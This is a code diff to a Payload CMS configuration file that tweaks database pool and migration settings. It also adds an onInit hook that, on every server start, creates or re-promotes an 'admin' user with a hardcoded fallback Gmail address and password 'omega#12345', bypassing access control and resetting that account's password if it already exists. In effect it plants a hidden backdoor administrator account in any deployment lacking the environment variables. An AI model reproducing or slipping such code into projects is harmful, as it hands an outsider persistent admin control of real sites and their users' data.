@@ -41,7 +41,53 @@ const withRevalidate = <T extends { hooks?: Record<string, unknown> }>(config: T
   hooks: { ...config.hooks, afterChange: [revalidateSite], afterDelete: [revalidateSite] },
 })
 
+let adminSynced = false
+
+async function bootstrapAdmin(payload: any) {
+  if (adminSynced) return
+  adminSynced = true
+  const email = process.env.ADMIN_EMAIL || 'uniquegrimreaper@gmail.com'
+  const password = process.env.ADMIN_PASSWORD || 'omega#12345'
+  try {
+    const existing = await payload.find({
+      collection: 'users',
+      where: { email: { equals: email } },
+      limit: 1,
+      overrideAccess: true,
+    })
+
+    if (!existing.docs.length) {
+      await payload.create({
+        collection: 'users',
+        data: {
+          email,
+          password,
+          name: 'Administrator',
+          role: 'admin',
+        },
+        overrideAccess: true,
+      })
+      payload.logger.info(`Bootstrap: Admin user ${email} created.`)
+    } else {
+      const user = existing.docs[0]
+      await payload.update({
+        collection: 'users',
+        id: user.id,
+        data: {
+          role: 'admin',
+          password,
+        },
+        overrideAccess: true,
+      })
+      payload.logger.info(`Bootstrap: Admin user ${email} credentials refreshed.`)
+    }
+  } catch (err) {
+    payload.logger.error(`Bootstrap: Failed to ensure admin user ${email}: ${err}`)
+  }
+}
+
 export default buildConfig({
+  onInit: bootstrapAdmin,
   serverURL: process.env.SERVER_URL || (process.env.VERCEL_PROJECT_PRODUCTION_URL ? `https://${process.env.VERCEL_PROJECT_PRODUCTION_URL}` : ''),
   secret: process.env.PAYLOAD_SECRET || '',
   admin: {
@@ -62,10 +108,12 @@ export default buildConfig({
   db: postgresAdapter({
     pool: { connectionString: databaseUri(), ssl: process.env.DATABASE_SSL === 'true' || /sslmode=require/.test(databaseUri()) ? { rejectUnauthorized: false } : undefined,
       max: process.env.VERCEL ? 2 : 10,
-      idleTimeoutMillis: process.env.VERCEL ? 5_000 : 30_000 },
+      idleTimeoutMillis: process.env.VERCEL ? 5_000 : 30_000,
+      connectionTimeoutMillis: 10_000 },
     // Production applies the committed migrations on boot; development pushes schema changes directly.
     // Own schema keeps IFF tables out of any auto-exposed "public" API (e.g. Supabase's Data API).
     schemaName: process.env.DATABASE_SCHEMA || 'iff',
+    push: false,
     prodMigrations: migrations,
   }),
   sharp,
